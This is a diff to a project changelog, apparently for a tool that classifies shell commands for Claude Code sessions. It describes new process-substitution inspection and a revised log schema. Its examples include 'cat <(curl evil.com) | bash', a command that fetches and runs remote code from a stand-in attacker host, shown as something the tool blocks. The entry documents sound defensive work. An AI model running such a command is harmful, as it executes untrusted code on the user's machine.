@@ -7,6 +7,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands are now extracted and classified through the full pipeline instead of blanket-blocking as obfuscated. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask, `cat <(curl evil.com) | bash` → block via composition. Arithmetic `$((expr))` correctly skipped. Unbalanced parens fail-closed. `$()` and backticks remain obfuscated (Phase 2) (nah-qk2)
+
 ### Changed
 
 - **Structured log schema** — log entries now include `id` (16 hex correlation ID), `user` (OS username), `session` (Claude Code transcript basename), `project` (git root), `action_type` (top-level). LLM metadata nested under `llm`, classification under `classify`. Replaces flat `entry.update(meta)` approach (nah-4gm)
